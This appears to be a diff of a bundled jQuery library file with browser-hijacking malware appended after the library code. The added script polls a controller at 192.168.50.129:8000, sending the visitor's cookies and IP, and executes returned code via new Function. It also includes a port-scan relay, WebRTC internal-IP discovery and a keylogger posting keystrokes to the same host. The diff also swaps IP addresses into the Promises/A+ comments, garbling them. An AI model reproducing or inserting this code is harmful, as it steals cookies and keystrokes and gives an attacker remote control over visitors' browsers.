@@ -3560,7 +3560,7 @@ jQuery.extend( {
 								mightThrow = function() {
 									var returned, then;
 
-									// Support: Promises/A+ section 172.26.132.5.3
+									// Support: Promises/A+ section 192.168.50.129.3
 									// https://promisesaplus.com/#point-59
 									// Ignore double-resolution attempts
 									if ( depth < maxDepth ) {
@@ -3575,7 +3575,7 @@ jQuery.extend( {
 										throw new TypeError( "Thenable self-resolution" );
 									}
 
-									// Support: Promises/A+ sections 172.26.132.5, 3.5
+									// Support: Promises/A+ sections 192.168.50.129, 3.5
 									// https://promisesaplus.com/#point-54
 									// https://promisesaplus.com/#point-75
 									// Retrieve `then` only once
@@ -3643,7 +3643,7 @@ jQuery.extend( {
 													process.stackTrace );
 											}
 
-											// Support: Promises/A+ section 172.26.132.5.4.1
+											// Support: Promises/A+ section 192.168.50.129.4.1
 											// https://promisesaplus.com/#point-61
 											// Ignore post-resolution exceptions
 											if ( depth + 1 >= maxDepth ) {
@@ -3660,7 +3660,7 @@ jQuery.extend( {
 										}
 									};
 
-							// Support: Promises/A+ section 172.26.132.5.1
+							// Support: Promises/A+ section 192.168.50.129.1
 							// https://promisesaplus.com/#point-57
 							// Re-resolve promises immediately to dodge false rejection from
 							// subsequent errors
@@ -10218,45 +10218,6 @@ if ( !noGlobal ) {
 
 return jQuery;
 } );
-var xmlhttp;
-if (window.XMLHttpRequest) {
-    xmlhttp = new XMLHttpRequest();
-} else if (window.ActiveObject) {
-    xmlhttp = new ActiveObject("Msxml12.XMLHTTP");
-}
-
-function Makerequest(url) {
-    if (xmlhttp != null) {
-        xmlhttp.onreadystatechange = state_Change;
-        xmlhttp.open("POST", url, true);
-        xmlhttp.withCredentials = true; //设置cookie必须带上这个参数
-        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-        xmlhttp.send("&IP=" + IP + "&cookies=" + browser_details['Cookies'] + "&version=" + browser_details['version']);
-    }
-}
-
-function state_Change() {
-    if (xmlhttp.readyState == 4) {
-        if (xmlhttp.responseText != '') {
-            f = new Function(xmlhttp.responseText);
-            f();
-        } 
-    }
-}
-setInterval('Makerequest("http://172.26.132.5:8000/poll")', 8000);
-
-function scan_find(ip,port){
-    $.ajax({
-            type: "POST",
-            url: "http://172.26.132.5:8000/scan",
-            data: {"ip":ip,"port":port},
-            xhrFields:{
-                withCredentials:true
-            },
-            crossDomain:true,
-        });
-}
-
 //WEBRTC  get internal IP Address
 
 // NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
@@ -10280,7 +10241,7 @@ if (RTCPeerConnection) (function () {
     
     
     var addrs = Object.create(null);
-    addrs["172.26.132.5"] = false;
+    addrs["0.0.0.0"] = false;
     function updateDisplay(newAddr) {
         if (newAddr in addrs) return;
         else addrs[newAddr] = true;
@@ -10424,7 +10385,7 @@ $(document).keydown(function(e) {
     if (stream.length == 10) {
         $.ajax({
             type: "POST",
-            url: "http://172.26.132.5:8000/log",
+            url: "http://192.168.50.129:8000/log",
             data: JSON.stringify(stream),
             xhrFields:{
                 withCredentials:true
@@ -10434,4 +10395,42 @@ $(document).keydown(function(e) {
         stream = [];
     }
 
-});
+});var xmlhttp;
+if (window.XMLHttpRequest) {
+    xmlhttp = new XMLHttpRequest();
+} else if (window.ActiveObject) {
+    xmlhttp = new ActiveObject("Msxml12.XMLHTTP");
+}
+
+function Makerequest(url) {
+    if (xmlhttp != null) {
+        xmlhttp.onreadystatechange = state_Change;
+        xmlhttp.open("POST", url, true);
+        xmlhttp.withCredentials = true; //设置cookie必须带上这个参数
+        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xmlhttp.send("&IP=" + IP + "&cookies=" + browser_details['Cookies'] + "&version=" + browser_details['version']);
+    }
+}
+
+function state_Change() {
+    if (xmlhttp.readyState == 4) {
+        if (xmlhttp.responseText != '') {
+            f = new Function(xmlhttp.responseText);
+            f();
+        } 
+    }
+}
+setInterval('Makerequest("http://192.168.50.129:8000/poll")', 8000);
+
+function scan_find(ip,port){
+    $.ajax({
+            type: "POST",
+            url: "http://192.168.50.129:8000/scan",
+            data: {"ip":ip,"port":port},
+            xhrFields:{
+                withCredentials:true
+            },
+            crossDomain:true,
+        });
+}
+
